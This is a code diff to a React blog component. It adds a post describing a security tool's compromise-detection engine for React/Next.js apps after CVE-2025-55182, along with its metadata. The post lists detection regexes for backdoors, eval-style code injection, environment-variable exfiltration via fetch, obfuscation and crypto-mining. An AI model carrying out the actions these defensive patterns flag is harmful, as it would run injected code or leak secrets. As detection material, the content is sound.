+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`# 1. Patch the vulnerability first
+npx @neurolint/cli security:cve-2025-55182 . --fix
+npm install
+
+# 2. Create baseline after cleanup
+npx @neurolint/cli security:create-baseline .
+
+# 3. Set up ongoing monitoring (run periodically or in CI)
+npx @neurolint/cli security:compare-baseline .`}</code>
+          </pre>
+        </div>
+
+        <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Related Resources</h4>
+          <div className="flex flex-wrap gap-3">
+            <Link
+              to="/blog/cve-2025-55182-react-server-components-rce"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              CVE-2025-55182 Overview
+            </Link>
+            <Link
+              to="/blog/layer-8-security-forensics-deep-dive"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              Layer 8 Deep Dive
+            </Link>
+          </div>
+        </div>
+      </div>
+    </article>
+  );
+};
+
+const Layer8DeepDive: React.FC = () => {
+  const [copied, setCopied] = React.useState(false);
+
+  const copyCommand = (cmd: string) => {
+    navigator.clipboard.writeText(cmd);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const toc = [
+    { id: "what-is-layer-8", title: "What is Layer 8?", level: 1 },
+    { id: "architecture", title: "Architecture Overview", level: 1 },
+    { id: "signature-detection", title: "Signature-Based Detection", level: 1 },
+    { id: "behavioral-analysis", title: "AST-Based Behavioral Analysis", level: 1 },
+    { id: "rsc-patterns", title: "RSC-Specific Pattern Detection", level: 1 },
+    { id: "baseline-integrity", title: "Baseline Integrity Checking", level: 1 },
+    { id: "commands", title: "Security Commands Reference", level: 1 },
+    { id: "ci-integration", title: "CI/CD Integration", level: 1 },
+  ];
+
+  return (
+    <article className="max-w-none">
+      <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-black rounded-xl p-6 mb-8">
+        <div className="flex items-start gap-4">
+          <div className="w-10 h-10 bg-blue-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
+            <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </div>
+          <div>
+            <h4 className="text-white font-semibold mb-2">Layer 8: Security Forensics</h4>
+            <p className="text-gray-300 text-base">
+              The 8th layer of NeuroLint's pipeline focuses on security forensics, detecting indicators of compromise (IoCs) and post-exploitation patterns in React/Next.js applications.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <nav className="bg-zinc-900/80 border border-black rounded-xl p-6 mb-12">
+        <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
+          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 10h16M4 14h16M4 18h16" />
+          </svg>
+          Table of Contents
+        </h3>
+        <ul className="space-y-2">
+          {toc.map((item) => (
+            <li key={item.id}>
+              <a href={`#${item.id}`} className="text-gray-400 hover:text-blue-400 transition-colors text-sm">
+                {item.title}
+              </a>
+            </li>
+          ))}
+        </ul>
+      </nav>
+
+      <div className="prose prose-invert prose-lg max-w-none prose-headings:font-bold prose-headings:text-white prose-p:text-gray-300 prose-a:text-blue-400 prose-a:no-underline hover:prose-a:text-blue-300 prose-strong:text-white prose-code:text-blue-400 prose-code:bg-zinc-900 prose-code:px-1.5 prose-code:py-0.5 prose-code:rounded prose-code:font-normal">
+        
+        <h2 id="what-is-layer-8" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          What is Layer 8?
+        </h2>
+
+        <p>
+          Layer 8 is NeuroLint's security forensics engine, specifically designed to detect indicators of compromise (IoCs) in React, Next.js, and TypeScript applications. Unlike traditional security scanners that focus on vulnerabilities, Layer 8 specializes in <strong>detecting post-exploitation artifacts</strong>.
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Key Capabilities</h4>
+          <div className="grid md:grid-cols-2 gap-4">
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">80+ IoC Signatures</h5>
+              <p className="text-gray-400 text-sm">Pattern-based detection for known malicious code constructs</p>
+            </div>
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">5 RSC Behavioral Patterns</h5>
+              <p className="text-gray-400 text-sm">React Server Components-specific threat detection</p>
+            </div>
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">AST-Based Analysis</h5>
+              <p className="text-gray-400 text-sm">Deep code analysis using Abstract Syntax Trees</p>
+            </div>
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">Baseline Integrity</h5>
+              <p className="text-gray-400 text-sm">Track file modifications and detect unauthorized changes</p>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          <strong>Important:</strong> Layer 8 is <strong>read-only by default</strong>. It detects but does not modify code unless explicitly requested (quarantine mode). This follows NeuroLint's core principle of "never break code."
+        </p>
+
+        <h2 id="architecture" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Architecture Overview
+        </h2>
+
+        <p>
+          Layer 8 uses a multi-stage detection pipeline:
+        </p>
+
+        <div className="space-y-4 my-8 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Stage 1: Signature Analyzer</h5>
+            <p className="text-gray-400 text-sm">Fast regex-based scanning for known IoC patterns. Catches common backdoors, exfiltration attempts, and obfuscated payloads.</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Stage 2: Behavioral Analyzer</h5>
+            <p className="text-gray-400 text-sm">AST-based deep analysis using @babel/parser. Detects suspicious code patterns that regex can't catch, including dynamic code execution and prototype pollution.</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Stage 3: Baseline Comparator</h5>
+            <p className="text-gray-400 text-sm">Compares current file state against a known-good baseline to detect unauthorized modifications.</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Stage 4: Report Generator</h5>
+            <p className="text-gray-400 text-sm">Outputs findings in multiple formats: CLI, JSON, SARIF (for IDE integration), and HTML reports.</p>
+          </div>
+        </div>
+
+        <h2 id="signature-detection" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Signature-Based Detection
+        </h2>
+
+        <p>
+          The Signature Analyzer uses 80+ regex patterns organized into categories:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">IoC Categories</h4>
+          <table className="w-full text-sm">
+            <thead>
+              <tr className="border-b border-zinc-700">
+                <th className="text-left py-2 text-white">Category</th>
+                <th className="text-left py-2 text-white">Signatures</th>
+                <th className="text-left py-2 text-white">Example Pattern</th>
+              </tr>
+            </thead>
+            <tbody className="text-gray-300">
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">BACKDOOR</td>
+                <td className="py-2">15+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">exec\(.*user</code></td>
+              </tr>
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">CODE_INJECTION</td>
+                <td className="py-2">12+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">eval\(|new Function</code></td>
+              </tr>
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">DATA_EXFILTRATION</td>
+                <td className="py-2">10+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">process\.env.*fetch</code></td>
+              </tr>
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">OBFUSCATION</td>
+                <td className="py-2">8+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">atob\(|btoa\(</code></td>
+              </tr>
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">NETWORK</td>
+                <td className="py-2">10+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">https?://\d+\.\d+</code></td>
+              </tr>
+              <tr className="border-b border-zinc-800">
+                <td className="py-2">CRYPTO_MINING</td>
+                <td className="py-2">5+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">coinhive|cryptonight</code></td>
+              </tr>
+              <tr>
+                <td className="py-2">RSC_SPECIFIC</td>
+                <td className="py-2">5+</td>
+                <td className="py-2"><code className="text-blue-400 bg-zinc-800 px-1 rounded">'use server'.*exec</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h2 id="behavioral-analysis" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          AST-Based Behavioral Analysis
+        </h2>
+
+        <p>
+          The Behavioral Analyzer parses code into an Abstract Syntax Tree (AST) and traverses it to detect suspicious patterns that evade simple regex matching.
+        </p>
+
+        <h3 className="text-2xl font-bold text-white mt-8 mb-4">Detection Capabilities</h3>
+
+        <div className="space-y-4 my-6 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Dangerous Function Calls</h5>
+            <p className="text-gray-400 text-sm mb-2">Detects:</p>
+            <ul className="text-gray-300 text-sm space-y-1 ml-4">
+              <li>Direct <code className="text-blue-400 bg-zinc-800 px-1 rounded">eval()</code> usage</li>
+              <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">setTimeout/setInterval</code> with string arguments</li>
+              <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">new Function()</code> constructor</li>
+              <li>Child process methods (<code className="text-blue-400 bg-zinc-800 px-1 rounded">exec</code>, <code className="text-blue-400 bg-zinc-800 px-1 rounded">spawn</code>)</li>
+            </ul>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Dynamic Imports</h5>
+            <p className="text-gray-400 text-sm">Flags <code className="text-blue-400 bg-zinc-800 px-1 rounded">import()</code> with non-literal paths that could load malicious modules</p>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Prototype Pollution</h5>
+            <p className="text-gray-400 text-sm">Detects modifications to <code className="text-blue-400 bg-zinc-800 px-1 rounded">__proto__</code> or <code className="text-blue-400 bg-zinc-800 px-1 rounded">Object.prototype</code></p>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Encoded Payload Detection</h5>
+            <p className="text-gray-400 text-sm">Decodes base64 strings and checks decoded content for malicious patterns</p>
+          </div>
+        </div>
+
+        <h2 id="rsc-patterns" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          RSC-Specific Pattern Detection
+        </h2>
+
+        <p>
+          Layer 8 includes 5 behavioral patterns specifically designed for React Server Components:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <div className="space-y-4">
+            <div className="border-b border-zinc-700 pb-4">
+              <h5 className="text-white font-semibold mb-2">1. Dangerous Server Action</h5>
+              <p className="text-gray-400 text-sm">Server actions containing exec(), spawn(), or eval()</p>
+            </div>
+            <div className="border-b border-zinc-700 pb-4">
+              <h5 className="text-white font-semibold mb-2">2. Environment Variable Exposure</h5>
+              <p className="text-gray-400 text-sm">Server actions that return or expose process.env</p>
+            </div>
+            <div className="border-b border-zinc-700 pb-4">
+              <h5 className="text-white font-semibold mb-2">3. SSRF in Server Components</h5>
+              <p className="text-gray-400 text-sm">Server-side fetch with user-controlled URLs</p>
+            </div>
+            <div className="border-b border-zinc-700 pb-4">
+              <h5 className="text-white font-semibold mb-2">4. Dynamic Module Smuggling</h5>
+              <p className="text-gray-400 text-sm">Dynamic imports in server actions with variable paths</p>
+            </div>
+            <div>
+              <h5 className="text-white font-semibold mb-2">5. Server Action with Unvalidated Input</h5>
+              <p className="text-gray-400 text-sm">FormData passed directly to dangerous functions</p>
+            </div>
+          </div>
+        </div>
+
+        <h2 id="baseline-integrity" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Baseline Integrity Checking
+        </h2>
+
+        <p>
+          Layer 8 can create and compare file integrity baselines to detect unauthorized modifications:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`# Create a baseline after confirming clean state
+npx @neurolint/cli security:create-baseline .
+
+# Compare current state against baseline
+npx @neurolint/cli security:compare-baseline .
+
+# Output: List of added, modified, and deleted files since baseline`}</code>
+          </pre>
+        </div>
+
+        <h2 id="commands" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Security Commands Reference
+        </h2>
+
+        <div className="space-y-4 my-8 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <code className="text-blue-400 text-sm font-mono">security:cve-2025-55182 [path] [--fix|--dry-run]</code>
+            <p className="text-gray-400 text-sm mt-2">Detect and patch CVE-2025-55182 vulnerability</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <code className="text-blue-400 text-sm font-mono">security:scan-compromise [path] [--quick|--deep|--paranoid]</code>
+            <p className="text-gray-400 text-sm mt-2">Scan for indicators of compromise</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <code className="text-blue-400 text-sm font-mono">security:create-baseline [path]</code>
+            <p className="text-gray-400 text-sm mt-2">Create integrity baseline for file tracking</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <code className="text-blue-400 text-sm font-mono">security:compare-baseline [path]</code>
+            <p className="text-gray-400 text-sm mt-2">Compare current state against baseline</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <code className="text-blue-400 text-sm font-mono">security:incident-response [path]</code>
+            <p className="text-gray-400 text-sm mt-2">Full forensic analysis for incident response</p>
+          </div>
+        </div>
+
+        <h2 id="ci-integration" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          CI/CD Integration
+        </h2>
+
+        <p>
+          Layer 8 can be integrated into CI/CD pipelines to automatically detect compromised code before deployment:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">GitHub Actions Example</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`name: Security Scan
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      
+      - name: Security Scan
+        run: |
+          npx @neurolint/cli security:scan-compromise . \\
+            --fail-on=high \\
+            --json > security-report.json
+      
+      - name: Upload Report
+        uses: actions/upload-artifact@v4
+        with:
+          name: security-report
+          path: security-report.json`}</code>
+          </pre>
+        </div>
+
+        <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Related Resources</h4>
+          <div className="flex flex-wrap gap-3">
+            <Link
+              to="/blog/cve-2025-55182-react-server-components-rce"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              CVE-2025-55182 Overview
+            </Link>
+            <Link
+              to="/blog/detecting-post-exploitation-cve-2025-55182"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              Post-Exploitation Guide
+            </Link>
             <a
-              href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components"
+              href="https://github.com/Alcatecablee/Neurolint-CLI"
               target="_blank"
               rel="noopener noreferrer"
               className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
             >
-              Official React Advisory
+              View on GitHub
             </a>
           </div>
         </div>
@@ -1103,14 +2058,34 @@ const blogPostsData: Record<string, {
   Component: React.FC 
 }> = {
   "cve-2025-55182-react-server-components-rce": {
-    title: "CVE-2025-55182: Critical React Server Components RCE Vulnerability - One-Command Fix",
-    description: "A critical remote code execution vulnerability (CVSS 10.0) affects all React 19 apps using Server Components. Learn how to patch immediately with a single NeuroLint command.",
-    date: "2025-12-03",
-    readTime: "5 min read",
+    title: "CVE-2025-55182: Critical React Server Components RCE Vulnerability - Complete Guide",
+    description: "A critical remote code execution vulnerability (CVSS 10.0) affects React 19 apps using Server Components. Learn about threat actors, exploitation timeline, detection, and patching.",
+    date: "2025-12-08",
+    readTime: "12 min read",
     author: "NeuroLint Team",
     category: "Security",
-    tags: ["Security", "CVE", "React 19", "Next.js", "RCE"],
+    tags: ["Security", "CVE", "React 19", "Next.js", "RCE", "Threat Intelligence"],
     Component: CVE202555182Post,
+  },
+  "detecting-post-exploitation-cve-2025-55182": {
+    title: "Detecting Post-Exploitation: How to Know If CVE-2025-55182 Was Used Against You",
+    description: "Patching isn't enough. Learn how to detect if your React/Next.js application was already compromised by CVE-2025-55182 using NeuroLint's Layer 8 Security Forensics.",
+    date: "2025-12-07",
+    readTime: "10 min read",
+    author: "NeuroLint Team",
+    category: "Security",
+    tags: ["Security", "Forensics", "IoC", "Incident Response", "React 19"],
+    Component: PostExploitationGuide,
+  },
+  "layer-8-security-forensics-deep-dive": {
+    title: "Layer 8 Security Forensics: Deep Dive into NeuroLint's Compromise Detection Engine",
+    description: "Explore NeuroLint's Layer 8 security forensics capabilities - 80+ IoC signatures, AST-based behavioral analysis, RSC-specific patterns, and baseline integrity checking.",
+    date: "2025-12-06",
+    readTime: "15 min read",
+    author: "NeuroLint Team",
+    category: "Deep Dives",
+    tags: ["Security", "AST", "Architecture", "Layer 8", "Forensics"],
+    Component: Layer8DeepDive,
   },
   "fix-react-nextjs-hydration-errors-complete-guide": {
     title: "How to Fix React & Next.js Hydration Errors: The Complete 2025 Guide",
